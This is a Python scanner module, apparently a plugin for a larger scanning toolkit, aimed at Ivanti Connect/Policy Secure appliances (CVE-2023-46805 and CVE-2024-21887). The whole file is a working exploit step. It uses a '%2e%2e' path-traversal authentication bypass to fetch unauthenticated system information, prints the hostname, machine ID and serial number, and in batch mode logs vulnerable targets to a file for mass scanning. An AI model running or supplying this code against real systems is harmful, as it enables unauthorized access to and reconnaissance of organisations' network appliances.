#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_21887:
    def check_vulnerability(self,url):
        try:
            response = requests.get(
                url + "/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark",
                verify=self.ssl,headers=self.headers, proxies=self.proxy)

            if response.status_code == 403 and len(response.text) == 0:
                final_url = f"{url}/api/v1/totp/user-backup-code/%2e%2e/%2e%2e/system/system-information"
                system_info = requests.get(final_url, verify=self.ssl,headers=self.headers, proxies=self.proxy)
                system_info_json = system_info.json()
                if system_info_json:
                    if not self.batch:
                        OutPrintInfoSuc("Ivanti","Target is VULNERABLE")
                        OutPrintInfo("Ivanti","SYSTEM INFORMATION")
                        OutPrintInfo("Ivanti","--------------------------")
                        system_info_json = system_info.json()
                        OutPrintInfo("Ivanti","OS NAME:       " + system_info_json["rollback-partition-information"]["os-name"])
                        OutPrintInfo("Ivanti","OS VERSION:    " + system_info_json["rollback-partition-information"]["os-version"])
                        OutPrintInfo("Ivanti","HOSTNAME:      " + system_info_json["system-information"]["host-name"])
                        OutPrintInfo("Ivanti","MACHINE ID:    " + system_info_json["system-information"]["machine-id"])
                        OutPrintInfo("Ivanti","SERIAL NUMBER: " + system_info_json["system-information"]["serial-number"])
                    else:
                        OutPrintInfoSuc("Ivanti", f'目标存在漏洞: {url}')
                        OutPutFile("ivanti_policy_secure_rce.txt",f'目标存在Ivanti policy secure 命令注入漏洞: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ivanti","Target is NOT VULNERABLE")

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Ivanti",f"Error: {e}")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            print("\033[94m==============================================")
            print("CVE-2023-46805 and CVE-2024-21887 Scanner")
            print("Twitter: @ramin_karimhani")
            print("==============================================\033[0m")
            OutPrintInfo("Ivanti", '开始检测Ivanti policy secure 命令注入漏洞...')
        self.check_vulnerability(url)

        if not self.batch:
            OutPrintInfo("Ivanti", 'Ivanti policy secure 命令注入漏洞检测结束')



